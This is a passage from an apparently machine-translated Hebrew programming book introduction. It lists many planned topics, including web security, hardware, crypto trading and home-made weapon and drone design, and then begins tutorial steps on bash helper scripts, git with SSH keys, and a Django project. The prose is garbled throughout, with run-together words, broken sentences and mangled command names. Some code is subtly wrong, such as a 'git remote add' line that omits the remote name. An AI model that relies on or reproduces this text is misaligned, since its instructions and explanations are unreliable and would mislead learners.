בחינם ומשולמות. לאורך הדרך, נחקור אבטחה פיזית וכלים מיליטנטיים כמו כלי נשק ותחמושת תכנון וייצור כולל עיצוב חבית ומשחזר, עיצוב צריח ומזל"ט, ומנהלים אחרים שנשתלב עם התוכנה שלנו ברשת הקיימת על מנת להגן על התוכנה שלנו ולהפגין הגנה עצמית וחיסול. ניקח הפסקות לאורך הדרך לבניית משחקים, 2d ו- 3Dמנועי סיבוב ועבודה עם חומרה משובצת בדוגמאות למבחני מחקרים לתוכנת עיבוד מימדית בסיסית ועיסוי רוטט אלקטרוני יצוק בגומי סיליקון בהתאמה. לאורך הדרך, אנו נשתמש גם בפתרונות למידת מכונות שכבר זמינים על מנת לאבטח טוב יותר את התוכנה שלנו. אנו גם נשתמש בכלי מניות הזמינים לאינטרנט על מנת לייעל את התהליך ולאבטח את התהליך. ספר זה מהווה מדריך להצלחתך בבניית יישום אינטרנט ושילובו ברשת מקצועית של מערכות מכונות מחשב ומטוס, ובסך הכל מדריך לבניית תוכנה וחומרה משובצת ללא ידע ברקע או ניסיון קודם. 

מה שהספר הזה אינו:
אם אתה באמת רוצה שיהיה לך אתר, אתה יכול פשוט להקים חנות פשוטה ולמכור את מה שאתה צריך, לפרסם בלוג, לפרסם תמונות או סרטונים, או אחרת מבלי לכתוב אי פעם שורת קוד אחת. הספר הזה לא זה. ספר זה ילמד אותך כיצד לבנות תוכנה שימושית יותר, באופן מלאמוצג, פונקציונלי ומאובטח מכל תוכנה שכבר תוכל למצוא, מכיוון שהיא מפרסת את התוכנה העדכנית ביותר שעדיין אבות -טיפוס, עשויה להיות יקרה להפעלה בקנה מידה של חברות ישנות פועלות בהן ואינן מושכות לאחור, חברות מפותלות שהוקמו להן הרוויחו כסף לאנשים שלא באמת עושים כלום. אם תעקוב אחר ספר זה מקרוב, תרצה לכתוב קוד, קוד מחקר, לבנות אפליקציות משלך ותרוויח כסף ממה שאתה עושה. אני ארוויח כסף מהספר הזה, אפילו בשלבים מוקדמים, מכיוון שהוא מכיל מידע שאנשים צריכים ורוצים לקרוא, וכבר קונים כשהם קונים או משתמשים באפליקציות שלי. ספר זה לא יבנה עבורך אפליקציה, אך הוא יפנה אותך בכיוון הנכון ויחמש אותך עם הכלים הדרושים לך וכישורים וטיפים שיאפשרו את ההצלחה שלך בבניית תוכנה לאינטרנט, עם כל שורה של קוד תצטרך לכתוב כדוגמה, מוכן להיות מחובר יחד לתוכנה שאתה ולתומכים שלך, אורחים, קהל לקוחות שלך,Riends, משפחה, מבקרים, קבלנים ואנשי האינטרנט רוצים להשתמש ולתמוך.

מה תלמד:
ספר זה ילמד אותך כיצד לבנות ולמכור תוכנה, תוכנה פונקציונלית, שימושית באמת, הקלטת מדיה, מאפייני אבטחה כמו זיהוי פנים, סריקת ברקוד באזור קריאה, ממשקידי אינטרנט כדי לאמת, להקליט ולהעביר וידאו ותמונות, ולהחליף הודעות כמו Bluetooth ותקשורת ליד שדה (NFC). ספר זה ילמד אותך כיצד להשתמש במחשב ברשת, תוך התמקדות בלינוקס של דביאן, כיצד לבנות קוד BASH כדי להפוך את ההתקנה והגיבוי של התוכנה שלך לרוח חלקה ואוטומטית, כיצד לבנות קוד פייתון כמתחם כדי לשרת הודעות דינאמיות, סגנון דברים יפה המשתמשים בסגנונות CSS עם Bootstrap, מאפשרים כניסות למשתמש ואינטראקטיביות באמצעות מכשירים ברשת, בנו מדיה אינטראקטיבית ורשת עם אתרים אחרים כדי להציע תכונות אבטחה כמו הודעות טקסט לאימות או למטרות אחרות, סריקת תעודות זהות, דימוי ווידאו, נתוניםשערות לשמירה על אבטחת התוכנה שלך, עיבוד תשלומים, סחר בקריפטו, משימות אסינכרוניות ועוד. תלמד כיצד לבנות מכשירי Bluetooth משלך, עם סוללות, מטענים, בקרי מיקרו, מעגלים, מנועים וחיישנים, באמצעות הלחמה, חוט ותלת מימד מודפסים כמו גם חומרים יצוקים. אני אדגים מנהלי עיצוב תלת מימד המיושמים על ייצור תוספים וייצור כלים ומות, כך שתוכלו לייצר מכשירי חומרה משובצים משלכם עם סוללות משולבות, מטענים, מעגלים אלקטרוניים ותפוקות פונקציונליות. ורשת אותם עם Bluetooth והאינטרנט. באופן ספציפי, נבחן שני מחקרי מקרה, עיסוי רוטט ונשק ביתי, שתיהן מתוכנת ב- OpenScad, הזמין כממשק גרפי או כלי עזר לשורת פקודה וניתן לשלב אותו באינטרנט לתוצאות מהירות יותר.
תלמד כיצד לבנות ולפרוס אתר מהיסוד ללא ניסיון קודם, הפוך אותו לתפקוד, מאובטח, יפה, שימושי והכימעשי באופן מובהק. תלמד כיצד להשתמש בלמידה במכונה ובראיית מחשב כדי להפוך אתר לאבטח ומעשי יותר, הקלט וידאו ושמע מאתר האינטרנט שלך, לתרום את הקול שלך, ליצור מוזיקה ולווסת שמע כדי ליצור דוגמאות שימושיות וכיצד לפרוץ את הרעש על ידי מינוף אתרים אחרים לבניית הרשת הטובה ביותר של אתרי אינטרנט שתוכלו לקשר ישירות לשלכם על מנת לשתף את כל המידע השימושי שיש לכם להציע, וחשוב מכך להביא אנשים לתוכנה ולעסק שלכם. ספר זה יתמקד ביותר במדיה, אבטחה ולמידה מכונה, שהם שלושת הרכיבים העיקריים שיעזרו לך לבנות תוכנה שימושית לאינטרנט על ידי מעורבות המשתמשים הנכונים ולהנתק את הלא נכונים באופן שהוא מציאותי, מעשי, ידיים ומרתקים תוך כדי אוטומטי, ויציב. 
ספר זה מלמד את יוניקס, ספציפית דביאן (אובונטו), Bash Shell, Python, HTML, CSS, JavaScript, ומספר חבילות תוכנה שימושיות עבורn כמו בקשות, כמו גם תוכנות BASH שימושיות כמו GIT ו- FFMPEG. אני גם אלמד אותך כיצד לסחור בקריפטו באופן אוטומטי, ולקחת תשלומים בקריפטו או מכרטיסי חיוב רגילים ואילו אפילו לשלם את המבקרים שלך חלק מההכנסות שלך אם תבחר לעשות זאת. אני אלמד אותך כיצד להרוויח כסף מהאתר שלך גם באמצעות פרסום, כיצד להכין את האפליקציה שלך למנועי חיפוש ולהפוך אותה למהירה, מדורגת בדירוג הראשון למה שהלקוחות שלך יחפשו כדי למצוא אותך, ולדירוג שכיחים רבים חיפושים ככל האפשר. אני אלמד אותך כיצד למכור את התוכנה שלך, לפרסם אותה, לפנות ללקוחות המחפשים את השירותים שלך ולעשות לעצמך שם באינטרנט באמצעות דרכים שכבר קיימות, לא יקרות ועובדות טוב. אני אלמד אותך כיצד לשמור את הנתונים שלך במחשבי ענן שעובדים עבורך ושמור את הנתונים שלך בזול, כיצד לתכנן ולבנות אתר שעושה את מה שהמשתמשים שלך רוצים ומה אתה רוצה ואיך לעסוק במשתמשים שלךהאתר שלך הברח על הטלפונים שלהם עם התראות, דוא"ל, הודעות טקסט, שיחות טלפון ועוד דרכים כדי להחזיר את המשתמשים שלך לאתר שלך לרשותך מאחורי לחיצה על כפתור שמאובטח לך בלבד. ספר זה יתמקד בפרקטיות של פרסום והפצת מדיה בכמויות גדולות, מטקסט לתמונות ועד סרטונים ועד אודיו, יוצר רושם טוב על משתמשי הקצה (קהל הלקוחות שלך) וימכור את עצמך בכל דרך שאתה עושה כדי ליצור אתר, אפליקציה המייצגת אותך ואתה בלבד, וגורמת לך, התוכנה שלך והחברה שלך להיראות טוב בצורה הטובה ביותר. תוכלו ללמוד ממני כמה טיפים וטריקים ממני, מתוך טיפים לקידוד, יהירות מעשית כמו איפור וצילום, דוגמנות ומשחק ועוד, מה שיהיה חשוב לתאר את עצמכם ואת החברה שלכם באור הטוב ביותר האפשרי באמצעות כל הכלים הזמינים לך תוך כדי הפצת תוכן רב ככל שאתה צריך על פני איזון בריא של פלטפורמות כדי להביא את שלךה למימוש ללא יותר מאמץ, עבודה או כסף ממה שצריך.
ספר זה נקרא "למידה עמוקה ואבטחה מעשית על בסיס דוגמה" מסיבה: הוא עוסק בלמידה לקוד, במיוחד לאינטרנט, במיוחד עם דגש על אבטחה, מבחינה מעשית, עם דוגמאות לקוד עבודה המשרתת המטרות המעשיות המפורטות בטקסט. רכיב הלמידה של טקסט זה מקיף גם את למידת המכונה, הקוד שאראה לך כיצד לרוץ עבור האינטרנט שיטפל בראיית מחשב, זיהוי פנים, מתינות תמונה ווידאו, שיפור תמונות, שיפור רזולוציה, כיתוב תמונות ומשימות אחרות כמו מדדי חיזוי שמקורם בתמונות, כמו אופי התמונה כתמונה אותנטית, הובלה מחשב, או עותק אופטי (תמונה של תמונה, או תמונה מודפסת). למידת מכונה חשובה מאוד כשמדובר באבטחת אתרים ואבטחת תוכנה, מכיוון שהיא יכולה להקדים משימות שהיו בלתי אפשריות אחרת. המחשב שלךהתחבר אותך עם קוד סיסמה, אך יתכן ובטוח יותר להשתמש בו אם הוא מתקשר אליך עם הפנים שלך. אתה יכול להפוך מחשב שרת לבטוח זה, מחשב שבדרך כלל יבקש מכם שם משתמש וקוד סיסמה ויתחבר אליך, אולי עם אסימון אישור לכל כניסה חדשה או כתובת IP חדשה, אבל אם אתה בונה בקנה מידה גדול, קל ל השתמש, תוכנה מאובטחת ויסודה ועוצמתית, זה עשוי להספיק. קשירת התוכנה שלך מקרוב לתוכנה של מישהו אחר, כמו שירות דוא"ל או שירות הודעות טקסט, אינה מספיקה בכדי להפוך את התוכנה שלך לאבטחת, או של מישהו (כל אתר שאתה משתמש בו).
לכל מי שבונה תוכנה המאובטחת ללא דופי, יש תחושה כלשהי של מה שמשמעות הדבר. תוכנה אינה בטוחה מטבעה מכיוון שהמכשירים והחשבונות שאנו משתמשים בהם כדי לגשת אליה לא תמיד עומדים לרשותנו, הם יכולים להיות בידי כל מי שיש לו כוונה לא טובה לתוכנה ולכן הם עשויים להוות סיכון לתוכנה עצמה. זה משהו ממוקד הספר הזה. מחשב ברשת הוא כברירת מחדלמאובטח עם אסימון מפתח ארוך, נקרא ו- SSH או מקש מעטפת מאובטח, ואחרת מאובטח בצורה הטובה ביותר בשרת אינטרנט, מכיוון ששרת האינטרנט מספק את הגישה הפתוחה כמו גם כלי האבטחה האמנותיים הפועלים בשרת עצמו. לשרת האינטרנט יש גישה לדפדפן האינטרנט של המשתמש, שהוא ללא ספק החלק החזק ביותר במכשיר המשתמש, מכיוון שהוא המקום בו המשתמש יכול לגשת לתוכנה ברשת. ערכת כלים זו יכולה להעביר טקסט, דפי האינטרנט שאתה רואה, ויכולה גם להקליט תמונות, שמע ווידאו (כמו תמונה של פנים או מזהה מדינה), יכול לקרוא ולכתוב למכשירי רדיו Bluetooth, ויכול לקרוא ולכתוב לשדה קרוב תגי משדר, כרטיסי מפתח זולים, FOBs, מדבקות, טבעות ואפילו שתלי שבבים עם מספרים סידוריים ייחודיים שניתן לקרוא ולכתוב אותם באמצעות נתונים שנוצרו ותוקף על ידי שרת אינטרנט הקשור לאתר האינטרנט. בעזרת כל הכלים העומדים לרשותכם, עם ספר זה תוכלו לצייד את עצמכם בידע לבניית אתר מאובטח, ובסך הכל אמערכת מחשב מחוברת ברשת שעובדת עבורך, עושה את ההצעה שלך ונראית ומרגישה נכונה.


איפה להתחיל:
אתם מוזמנים לדלג על החלק בקטע שאני מתחיל את הספר הזה, או כל קטע, על הקוד המדויק שאתם צריכים, במיוחד אם יש לכם ניסיון בקידוד לפני או בכל אחד מהכלים האמורים שאתאר בפירוט בספר זה כ- כמו גם תיעוד מקרי שימוש ודוגמאות מעשיות. אם אין לך ניסיון בכתיבת קוד, אני ממליץ לך לקרוא את כל הספר הזה, וממליץ לך במיוחד לקרוא את החלקים הקודמים, כדי לוודא שהספר הזה מתאים לך. אם ספר זה אינו מתאים לך, שקול להעניק אותו לחבר או קרוב משפחה שעשוי להיות מעוניין ללמוד על פיתוח אתרים בעצמם, ואפילו שקול להשאיל אותו בחזרה וללמוד מהם למלא את הפערים שבהם נכשלתי בך כ- מורה, או מורים אחרים עשו לפניי. התחל איפה שתעשה, כל חלק בספר זה יהיה שימושי אם אתה מתכוון לבנות שימושיPP, ושקול שהאפליקציות הטובות ביותר בנויות עם משתמש הקצה בראש: הכיר את הלקוח שלך. עכשיו אתה מכיר אותי, אתה מכיר את הספר הזה ואתה מוכן להתחיל. כדי להתחיל, תפוס מחשב (אפילו המחשב הנייד הזול ביותר מחנות קופסאות, אמזון או שולחן עבודה ישן עובד, והגדר אותו באופן שעובד עבורך.

כיצד לקרוא את הספר הזה:
טקסט מודגש, מציין כי הטקסט שייך לשורת פקודה, שם תכתוב את הקוד שאתה מפעיל. שורת הפקודה ממוקדת במקלדת כבדות ודורשת מעט לחיצה, להאיץ את זרימת העבודה שלך והקלת עליך את הדברים.

תחילת העבודה:
בואו נצלול פנימה. נתחיל בבניית קוד במחשב מקומי ונתחיל מבלי לבנות אתר המחובר לאינטרנט. זה בטוח יותר מלכתחילה, לא עולה כלום וקל לך. תלוי במערכת ההפעלה שלך, הכניסה לקליפת Bash תהיה קצת שונה. עבור Mac OS, אני ממליץ להתקין מחשב וירטואלי בנקודה זו, מכיוון שתקבל את התאימות המרובה ביותר עםמכונה וירטואלית. ספקים שונים כמו VirtualBox ו- Paralells יכולים להריץ עבורך מכונה וירטואלית, אם כי ניתן גם להתקין את אובונטו ישירות על המכונה, אם אתה מעדיף להשתמש בסביבה מקומית המומלצת על מנת ליצור חוויה מהירה ומייעלת. אם אתה משתמש ב- Linux או Windows, שאני ממליץ עליו, זה צריך להיות די קל ליצור פרויקט. פתח את הטרמינל שלך, התאם את הגודל כפי שאתה רואה לנכון, והתחל לעקוב אחר שלב 2. אם אתה משתמש ב- Windows, אנא עקוב אחר שלב 1.

שלב 1: - משתמשי Windows בלבד
ב- Windows, פתח את שורת הפקודה כמנהל וסוג 
WSL - התקן
   
שלב 2: - המשך כאן, או דלג על שלב 1 לכאן אם אינך משתמש ב- Windows
בטרמינל פתוח, (תלוי במערכת ההפעלה שלך, המכונה אובונטו ב- Windows, מסוף ב- Mac או Linux, או שם דומה), התחל ביצירת פרויקט. אנו עושים זאת עם הפקודה MKDIR, היוצרת ספרייה. אם אתה צריך ליצור ספרייה לאחסון הפרויקט שלך, המומלץ, השתמש בפקודת CD כדי לעבור לספריה ו 

CD/PATH/TO/Directory - הנתיב הוא התיקיות (קבצים) שקדמו לספריית היעד שלך, נתיב ברירת המחדל שלך הוא ~ או/בית/שם משתמש (שם שם המשתמש הוא שם המשתמש שלך). כדי לשנות את ספריית ברירת המחדל, הקלד CD או CD ~
דוגמה MKDIR - החלף את "דוגמה" בשם הספרייה

עכשיו יש לך ספריית עבודה לפרויקט שלך. בהיותו כל כך חשוב שהספרייה הזו תשמור למקרה שתצטרך לעבור למכונה אחרת או לפרוס את הקוד שאתה כותב כך שהוא מוכן לאינטרנט, אנו נבנה סקריפט כדי לגבות את הספרייה שלך בשלבים הבאים. אבל בניית סקריפט לוקח קצת קוד, וצריך לבצע אוטומציה של קוד כדי להיות שימושי ככל האפשר. אז בואו נבנה תחילה תסריט לבניית סקריפטים. נתחיל ביצירת התסריט והופך אותו להפעלה. אנו נשתמש ב- Sudo, Chmod ו- Touch בשביל זה ונתקשר לתסריט<pre class="language-bash"><code>
sudo touch /usr/bin/ascript
sudo chmod a+x /usr/bin/ascript
sudo nano /usr/bin/ascript
</code></pre>עכשיו יצרנו את התסריט, הפכנו אותו להפעלה, ומוכנים לערוך אותו. NANO הוא עורך טקסטים שיאפשר לך לערוך טקסט מבלי ללחוץ, וזה הרבה יותר קל מאשר להשתמש בממשק משתמש גרפי. כדי לערוך קובץ עם ננו, השתמש בננו ואז את הנתיב לקובץ. כדי להכין סקריפט שעושה תסריט, זה דומה למדי להכנת התסריט שלנו מלכתחילה. אנו נשתמש באותו קוד כמו לעיל, ונחליף את שם הסקריפט, "Ascript" בפרמטר טיעון, $ 1. זה מאפשר לנו לקרוא לתסריט על ידי הקלדת Sumbin Sudo Ascript Newscript, ובשלב זה נוכל ליצור כל סקריפט חדש על ידי החלפת "Newscript" בשם התסריט שלך. הקוד בננו צריך להיראות כמו:<pre class="language-bash"><code>
sudo touch /usr/bin/$1
sudo chmod a+x /usr/bin/$1
sudo nano /usr/bin/$1
</code></pre>וכדי לסגור את ננו, נוכל להחזיק את מקש הבקרה ולחץ על X, ואז y כדי לציין שאנחנו שומרים את הקובץ, ולחזור להחזיר. כעת במקום להקליד את שלוש הפקודות הללו כדי לערוך סקריפט, נוכל להקליד Sudo Ascript Ascript כדי לערוך את הסקריפט שוב. זה עובד! וכל תסריט חדש ניתן להפעיל בקלות על ידי קריאה אליו במעטפת. בואו נשמור את העבודה שלנו עכשיו: בואו נכתוב סקריפט גיבוי כדי לשמור את התסריט החדש שלנו ואז לגבות אותו בספריית הפרויקטים שלנו, תוך גיבוי של סקריפט הגיבוי.<pre class="language-bash"><code>
sudo ascript backup
</code></pre>עכשיו, בננו:<pre class="language-bash"><code>
sudo cp /usr/bin/backup /path/to/directory/
sudo cp /usr/bin/ascript /path/to/directory/
</code></pre>איפה/נתיב/ל/ספרייה הוא הנתיב לפרויקט שיצרת עם MKDIR. בהמשך נלמד כיצד להעתיק נתיבים חוזרים כמו זה עם לולאה ורשימה, שהיא פחות קוד, אך לעת עתה בואו נשמור על זה פשוט ויש לנו כמה שורות. כדי להריץ את הסקריפט הזה ולגבות את הקוד שלך, שמור את הקובץ ב- NANO עם שליטה+x, y והחזיר והקליד את למטה לקליפה שלך<pre class="language-bash"><code>
backup
</code></pre>אם אתה מתבקש בכלל לסיסמא בזמן קריאת ספר זה ומעקב אחר המעטפת, אנא הזן את סיסמת המשתמש שלך בצורה נכונה, יהיו לך שלושה ניסיונות לפני שתצטרך להפעיל מחדש את הפקודה. אתה יכול להשתמש בחצים למעלה ולמטה כדי מחדש לפקודות ולערוך אותן, אם תצטרך להריץ משהו פעמיים. לחץ פשוט למעלה ולמטה לסירוגין כדי לבחור פקודה, לפני עריכת הפקודה בעזרת החצים השמאליים ומקשת מחיקה כמו גם מקלדת, והפעלתו עם החזרה.

מזל טוב! הצלחת ליצור סקריפט גיבוי מדהים המגבה שני סקריפטים חשובים בספריית העבודה שלך. אנו עשויים להעביר דברים אחר כך ככל שהפרויקט הולך וגדל, אבל זה עובד לעת עתה. בואו נעבור לגיבוי בענן, אנו נשתמש ב- GitHub לשם כך (אם כי ישנם פתרונות GIT רבים אחרים לגיבוי, הם כולם בערך אותו תוכנה כשאתה עושה אותם לשרת, בזמןמה שמאפשר לך להוריד עותקים שלמים של התוכנה שלך מאחורי סיסמא או מקש. זה מסייע בשמירה של התוכנה שלך, במיוחד כשאנחנו נודדים למופעי לינוקס מאובטחים שלעתים נשברים כאשר שורה אחת של קוד נכשלת, ומותירה אותך נעול בזמן שהקוד שלך לא יגובה אם לא תקבל סיכוי לגבות אותו למעלה אוטומטית, שנכסה.

אם אתה כבר לא משתמש במכונה וירטואלית של אובונטו בשלב זה, אני ממליץ להשתמש במכונה וירטואלית של אובונטו בשלב זה מכיוון שזה יקל על חייך בעת התקנת כל החבילות הדרושות כדי לבנות אתר עובד ולקדם את הלמידה העמוקה פעולות במחשב שלך. אנו נעביר את הקוד לשרת אינטרנט בעתיד הקרוב, אך אנו רוצים לוודא שיש לפחות כמה שכבות אבטחה מאחורי שרת האינטרנט שלנו העמידים בפני דיוג, ונעסיק מספר חבילות לינוקס כדי לעשות זאת זֶה. אם אתה עדיין רוצה להשתמש במערכת ההפעלה של MAC, אתה מוזמן לחפש ולהתקיןE חבילות הכרחיות באופן מקוון, אך יתכן שלא יהיו אלטרנטיבות לכל חבילה שהספר או הסדרה שסוו.

בואו נוסיף כמה פקודות לביצוע עבודתנו עם סקריפט הגיבוי על ידי הפעלת Ascript Command Sudo<pre class="language-bash"><code># ...</code></pre>שוב, שלוט ב- X כדי לחסוך.

כעת עלינו לעשות תצורה אחת לאחת לפרויקט זה. מכיוון שבקרוב זה יהיה פרויקט GIT, איננו צריכים להקליד כל פקודה בכל פעם שאנחנו פורסים ממאגר GIT, אך נקבל את זה כשאנחנו כותבים את סקריפטים של הפריסה שלנו. כדי להתחיל, בואו נוודא שאנחנו בספריה הנכונה ונתחיל את מאגר ה- GIT ולייצר מפתחות SSH.<pre class="language-bash"><code>
cd /path/to/directory
git init
git branch -m master
ssh-keygen
</code></pre>לאחר שנקלד את SSH-Keygen, יש לשמור את המפתח החדש בתיקיית הבית תחת תיקיה בשם .ssh. זה נקרא id_rsa.pub. בואו נמצא את המפתח הזה ונעתיק אותו. לראות את זה,<pre class="language-bash"><code>
cd ~
cat .ssh/id_rsa.pub
</code></pre>העתק את הטקסט שמוחזר על ידי הפקודה האחרונה, וצור חשבון עם ספק GIT שלך (באופן אידיאלי GitHub), לפני שתוסיף את מקש ה- SSH לחשבונך. לאחר שיש לך חשבון, לחץ על התפריט השמאלי העליון והזן הגדרות, לפני שתוסיף את מקש ה- SSH שלך במקשי SSH ו- GPG תחת גישה בתפריט. בחר הוסף מפתח SSH והוסף את שלך על ידי הדבקתו פנימה והענקתו לו כותרת, לפני שתשמור וחזר ל- GitHub כדי ליצור מאגר חדש. זה דומה עבור ספקי GIT אחרים, תצטרך לקרוא את התיעוד שלהם. בתצורת המאגר החדש, תן למאגר שלך שם תיאורי והחליט אם ברצונך לפרסם אותו, וקפד להגדיר עדיין שום קבצים להכללה. לאחר יצירת המאגר, העתק את השיבוט בכתובת SSH והדבק אותו לפקודה הבאה.<pre class="language-bash"><code>
git remote add git://… (your remote URL)
</code></pre>עכשיו אתה יכול לחזור למאגר שלך עם CD, אתה תכיר את זה. נסה את סקריפט הגיבוי שלך עכשיו עם גיבוי

גָדוֹל! עכשיו אנחנו באמת יכולים לקבל קידוד. בואו להתקין את Django עכשיו כשיש לנו תפיסה טובה על Bash ו- Git. Django יאפשר לנו לגבות אוטומטית את התוכנה שלנו, Bash יכול לעשות זאת גם אבל ל- Django צריך להיות יישום בטוח יותר יותר (ניתן להשבית אותה ולהגדיר אותו ביתר קלות).

כדי להתקין תוכנה באובונטו, אנו נשתמש בפקודה SUDO APT-GET. ראשית, בואו נעדכן ולשדרג את התוכנה שכבר הייתה לנו. ניתן לעשות זאת באמצעות עדכון Sudo Apt-Get ושדרוג Sudo Apt-Get-Get -y. בשלב הבא, בואו להתקין את פייתון והסביבה הווירטואלית שלנו, בית הקוד שלנו, עם הפקודה הבאה: sudo apt-get התקנה python-is-python3 python3-venv

זה כל מה שאתה צריך כדי להתחיל עם Django מבחינת התקנות תוכנה במופע אובונטו. עבור Windows ו- Linux זה אמור להיות די פשוט, אבל עבור Mac אולי תרצה להתקין מחשב וירטואלי ולינוקס עליו באמצעות סביבה וירטואלית בחינם או בתשלום כמו Virtualbox או Paralells Desktop ולשחזר את השלבים שלמעלה על מנת להגדיר סביבת אובונטו. אובונטו הוא קריטי במקרה זה מכיוון שזו התוכנה שהאתרים מפעילים והיא מאפשרת להם לארח אתרים עם כל התוכנה הנ"ל.

בואו נחפור בדג'נגו.

בספריה שלנו שוב, עם<pre class="language-bash"><code>python -m venv venv # יוצר את הסביבה הווירטואלית בה מאוחסן הקוד
source venv/bin/activate # מפעיל את הסביבה הווירטואלית
django-admin startproject mysite . # איפה MySite הוא הפרויקט שאני מתחיל בספריה הנוכחית שלי.</code></pre>Django רק מתחיל אותנו, מכיוון שג'אנגו מארח את שרת האינטרנט ועושה את כל מה שאנחנו צריכים כדי להפעיל אתר מקומי בסיסי. כעת, לאחר שהתקין את Django, בואו נערוך קצת את ההגדרות כדי לגרום לזה לעבוד איך שאנחנו צריכים. ראשית, בואו ניצור אפליקציה חדשה<pre class="language-bash"><code>
python manage.py startapp feed
</code></pre>תבחין שהאפליקציה הראשונה נקראת Feed. יש לקרוא לאפליקציה ככל שתרצה, ואנחנו ניצור אפליקציות חדשות, אך שמו של כל אפליקציה חייב להיות עקבי בכל פעם שהאפליקציה מופנית בקוד. כדי להוסיף אפליקציה חדשה, אנו תמיד נערוך את ההגדרות. Py בספריה האחרת שהאפליקציה יצרה, בשם ב- StartProject, להלן אפליקציה. באמצעות ננו,<pre class="language-bash"><code>
nano app/settings.py
</code></pre>בהגדרות, מצא התקנה_אפס והפריד בין [] לשלושה שורות. בעזרת ארבעה חללים בשורת המרכז הריקה, הוסף 'הזנה' או שם האפליקציה שלך. החלק הזה של ההגדרות. PY צריך להיראות כמו:<pre class="language-python"><code>
INSTALLED_APPS = [
    'feed',
]
</code></pre>לפני שנשכח, בואו נבחן שג'אנגו עובד. בעזרת הפקודה Python Manage.py Runserver 0.0.0.0:8000, אנו יכולים להריץ את השרת ואז לנווט בדפדפן אינטרנט במחשב שמריץ את הקוד ל- http: // localhost: 8000 ולראות דוגמה של דף אינטרנט (זה עובד!) צא מהשרת עם Control C, זהה לכל פקודה אחרת.

עכשיו, בואו נחפור בכתיבת קוד פייתון. לדג'נגו שלושה רכיבים עיקריים, כולם מנוהלים על ידי קוד לחלוטין. הרכיבים נקראים מודל, תצוגה ותבנית, וכל אחד מהם נמצא ברמה גבוהה ונמוכה בהתאמה לפני שדף האינטרנט מועבר למשתמש.

המודל הוא הקוד המאחסן מידע במסד הנתונים לאחזור, מיון ועיבוד.

התצוגה מחליטה כיצד המודל ניתן, מניפולציה ושינוי, כמעט כל תצוגה תשתמש במודל ישירות.

התבנית היא קוד HTML עם כמה פעמונים ושריקות נוספות הנקראות שפת תבנית. התבנית ניתנת על ידי הנוף בו היא מלאה בקוד פייתון והקשר כמו מודלים ומידע (מיתרי Usuall ומספרים שלמים) מהנוף.

לדג'נגו יש גם רכיבים אחרים, כולל אך לא מוגבלים ל:

הגדרות, המגדירות את האפליקציה כפי שדיברנו.

כתובות אתרים, שהם דפוסים שהמשתמש עוקב אחריו כדי לקבל גישה לחלקים ספציפיים ביישום האינטרנט.

טפסים, המגדירים כיצד מידע שנשלח לשרת מטופל ומועברים למסד הנתונים כמו גם למשתמש. אלה הם הבסיס למידע על עיבוד בצד השרת, ויכולים לקבל כל סוג של מידע שמחסן המחשבים, בעיקר מיתרי טקסט, מספרים ובוליאנים אמיתיים/שווא (בדרך כלל תיבות סימון).

תבניות, שהן קוד HTML ושפת תבנית ומגשרות על הפער בין פייתון ל- HTML, כלומר מידע על פייתון יכול לשרת כקוד HTML שכל אחד יכול לגשת אליו ויכול לאבטח אתר עם גישה מוגבלת, תוך הפיכת קוד פיתון לנגיש לרשת ולשימוש למגוון מטרות במכשיר מרוחק שלאלהיות קרוב לשרת.

קבצים סטטיים, שהם בדרך כלל javaScript ומדובר בספריות שהשרת משרת ומקושר לתבנית.

קבצי מדיה, שהשרת משרת או מתארחים חיצונית, או סתם נכתבים לשרת לפני שהוא מעובד ומוצב לשרת אחר (דלי) לאירוח.

תוכנת Middleware, שהיא חתיכות קוד המופעלות במקביל לכל תצוגה ונחשבות "כלולות" בתצוגה.

מעבדי הקשר, המעבדים את ההקשר של כל תצוגה ומשמשים להוספת הקשר נוסף.

בדיקות, המאמתות כי המשתמש או הבקשה מעבירים דרישות מסוימות לפני שניתן לתצוגה.

צרכנים, המכתיבים כיצד WebSockets מתמודדים ומגיבים לתקשורת.

מנהל, המשמש לרישום דגמים כך שניתן יהיה לתפעל אותם בפירוט בתוך דף הניהול של Django, שם ניתן לתת את בסיס הנתונים דרך ממשק גרפי.

סלרי, המגדירה משימות אסינכרוניות חלקים מקוד הג'נגו יכולים להתחילning לפני שתמשיך מייד למשימה או לשורת הקוד הבאה.

לדג'נגו יכול להיות רכיבים רבים אחרים, עליהם נדון בפירוט כאן. יש המון דרכים להפוך את דג'נגו לפונקציונליות יותר, להוסיף את רשתות האינטרנט, המהירות ערוצי תקשורת מהירים, סלרי, המבצעים משימות אסינכרוניות, ושלל חתיכות תוכנה אחרות להרחבת Django, במיוחד בפונקציות הנוף, בהן רובם של רובם הקוד מבוצע. פונקציות תצוגה הן המפתח מכיוון שהן בדרך כלל מכריזות על כל פיסת קוד הספציפית לתבנית URL ספציפית, או על קטע מהשרת.

ראשית, בואו לחקור פונקציות תצוגה. פונקציות תצוגה מתחילות ביבוא המציין קוד שישמש בתצוגה, ומוגדרים באמצעות הגדרות או מחלקות פונקציה רגילות. התצוגות הפשוטות ביותר מוגדרות על ידי הגדרת הפונקציה def, ומחזירו HTTPresponse עם תבנית בסיסית. נתחיל בהגדרת תצוגה בסיסית להחזרת הטקסט "שלום עולם". זכור שבכל פעם שאתה מוסיףלהצהיר כמו DEF, אם, אם, עבור וכו ', תצטרך להוסיף 4 רווחים לכל אחת מההגדרות המקדמות שתרצה להחיל על הפונקציה שלך. ניכנס למה שאמצעים כל אחד מאלה בקרוב.

מהספרייה של האתר שלנו, ערוך את קובץ ה- feed/views.py באמצעות NANO והוסף את השורות הבאות לסוף ה-<pre class="language-python"><code>
from django.http import HttpResponse

def hello(request):
    return HttpResponse('hello world')
</code></pre>HTTPresponse של Django מגיב במחרוזת טקסט, המכונה עם הפתיחה והסגירה '. בכל פעם שאתה מעביר מידע לפונקציה או לשיעור, כמו בקשה או מחרוזת, תצטרך להשתמש בסוגריים (פתיחה וסגירה).

זה עדיין לא כל מה שאנחנו צריכים לראות את השקפתנו. כמובן, לא אמרנו לשרת היכן התצוגה בדיוק, אנו עדיין צריכים להגדיר נתיב שבאמצעותו התצוגה צריכה להעביר. נתחיל בהגדרת נתיב בסיסי באפליקציה/urls.py, ונכנס לקבוצות נתיבים בהמשך.

ב- App/urls.py, הוסף שורה לאחר הצהרות הייבוא ​​לאחר תחילת ייבוא ​​התצוגה שיצרנו זה עתה.<pre class="language-python"><code>
from feed import views as feed_views
